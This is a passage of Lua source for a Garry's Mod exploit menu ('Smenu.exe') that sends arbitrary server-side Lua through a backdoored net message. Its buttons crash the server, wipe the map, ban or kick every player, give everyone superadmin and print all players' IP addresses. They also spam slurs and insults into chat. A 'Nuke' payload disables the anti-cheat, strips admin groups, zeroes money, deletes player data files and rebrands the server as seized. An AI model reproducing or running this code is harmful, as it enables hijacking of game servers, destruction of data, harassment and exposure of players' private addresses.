Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 5 - RIP" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat5\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"RIP RIP RIP RIP\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 5 - RIP activé	" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 6 - Discord" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat6\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Discord menu : https://discord.gg/5ABgBZm\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 6 - Discord activé " )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 7 - ET TA MERE LA PUTE" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat7\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"ET TA MERE LA PUTE\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 6 - ET TA MERE LA PUTE activé " )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 8 - :^)  (^:" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat8\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \":^)  (^:\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 8 - :^)  (^: activé " )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 9 - Le HaX0rs" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat9\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Le HaX0r : https://steamcommunity.com/id/yapusurllol/\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 9 - Le HaX0rs activé " )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 10 - Gaysuz" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat10\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Gaysuz\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 10 - Gaysuz" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - STOP SPAM" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
timer.Remove ("tchat1")
timer.Remove ("tchat2")
timer.Remove ("tchat3")
timer.Remove ("tchat4")
timer.Remove ("tchat5")
timer.Remove ("tchat6")
timer.Remove ("tchat7")
timer.Remove ("tchat8")
timer.Remove ("tchat9")
timer.Remove ("tchat10")
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Stop spam" )
    SploitNotify("SPAM désactivé")
    surface.PlaySound("buttons/blip1.wav") 
end

----------------------------------------------------

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Stop Artillery Strike" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "hook.Remove( \"Think\" ,\"armageddon\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Stopping Strike" )
    SploitNotify("Stopping Strike")
    surface.PlaySound("buttons/blip1.wav") 
end
--[[]]
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 30 ) 
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "2D Players" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "2D Players activé" )
	    SploitNotify("2D players activé !")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "10000000€ toutes les 0.1sec tous les joueurs" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "10000000€ toutes les 0.1sec activé." )
    SploitNotify("MONEY MONEY MONEY")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cleanup" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Map clean up." )
    SploitNotify("Map cleanup !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Shutdown" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by Sparks.\") end end)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Arret..." )
    SploitNotify("RIP le serveur :)")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Artillery Strike" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local faggot = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)  
]]
net.Start(netKey)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Armageddon activé" )
    SploitNotify("Armageddon activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Nuke" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

timer.Create( "next_level_timer2", 20, 0, function()
    --Break some bad cmds
    local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
    --Break ULX
    if ULib then
        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
    end
    --Gamemode related
    if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
    end
 
    if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
    end
 
    if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)
     
        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
     
        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
    end
end)

if GetConVarnet.WriteString("sv_allowcslua") != "0" then
    RunConsoleCommand( "sv_allowcslua", "1" );
end

hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
    for k, v in pairs(player.GetAll()) do
        v:ConCommand("say Sparks is the best !");
    end
end)

RunConsoleCommand("hostname", "Seized by Sparks")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(netKey)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "NUKE activé !" )
    SploitNotify("NUKE SERVEUR (ça fail mal)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Taille grande" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde grandit ! :o" )
    SploitNotify("Tout le monde est grand !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Taille petite" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde devient petit :o" )
    SploitNotify("Tout le monde devient petit")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Speedhack" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Speedhack activé !" )
    SploitNotify("Speedhack activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cancer" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*cough*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Cancer activé" )
    SploitNotify("Cancer activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earthquake" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
net.Start(netKey)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Earthquake activé" )
    SploitNotify("Eathquake activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Print All IPs" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			for k, v in pairs( player.GetAll() ) do 
				
				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
				
			end
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Print All IPs" )
    SploitNotify("Print All IPs")
    surface.PlaySound("buttons/blip1.wav") 
end	

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Ban Everyone" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
				local id = ]] .. LocalPlayer():UserID() .. [[
			
				for k, v in next, player.GetAll() do
				
					if v:UserID() == id then continue end
				
					v:Ban( 0, false )
				
					v:Kick( "]] .. tostring( text ) .. [[" )
					
				end
		
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Ban Everyone ACTIVE!" )
    SploitNotify("Ban Everyone ACTIVE!")
    surface.PlaySound("buttons/blip1.wav") 
end	

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Kick Everyone" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
				local id = ]] .. LocalPlayer():UserID() .. [[
			
				for k, v in next, player.GetAll() do
				
					if v:UserID() == id then continue end
				
					v:Kick( 0, false )
				
					v:Ban( "]] .. tostring( text ) .. [[" )
					
				end
		
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Ban Everyone ACTIVE!" )
    SploitNotify("Ban Everyone ACTIVE!")
    surface.PlaySound("buttons/blip1.wav") 
end	

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 450 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Footsteps" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[
		
		hook.Add( "PlayerFootstep", "oooh", function( ply ) 
			
			ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
			
		end )
		
]] )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Enabled moaning footsteps." )
    SploitNotify("Enabled moaning footsteps.")
    surface.PlaySound("buttons/blip1.wav") 
end	

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 480 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Téléportation Troll" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) end" )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tous le monde a été téléporter quelque part." )
    SploitNotify("Tous le monde a été téléporter quelque part.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 510 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Tous le monde Superadmin" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"fadmin\", \"setaccess\", \"*\", \"\")" )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tous le monde est devenu Superadmin !." )
    SploitNotify("Tous le monde est devenu Superadmin !.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 540 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Forcer Les Joueurs A Rire" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end timer.Create(\"rire_loop\",7.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end end )" )
